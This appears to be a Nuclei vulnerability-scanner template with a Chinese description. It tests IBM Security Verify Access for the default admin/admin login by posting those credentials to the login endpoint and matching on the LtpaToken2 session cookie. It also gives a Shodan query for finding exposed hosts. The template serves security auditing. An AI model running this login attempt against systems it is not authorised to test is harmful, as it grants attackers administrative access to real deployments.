id: ibm-security-verify-default-login

info:
  name: IBM Security Verify Access 默认口令登录（弱口令）
  author: johnk3r
  severity: high
  description: |
    该模板通过尝试 IBM Security Verify Access 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    verified: true
    max-request: 2
    shodan-query: title:"IBM Security Verify Access"
  tags: ibm,default-login,vuln

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /core/j_security_check HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        j_username={{username}}&j_password={{password}}&commit=&locale=en&_method=PUT

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    matchers:
      - type: dsl
        dsl:
          - "len(body) == 0"
          - "status_code == 302"
          - "contains(set_cookie, 'LtpaToken2')"
        condition: and
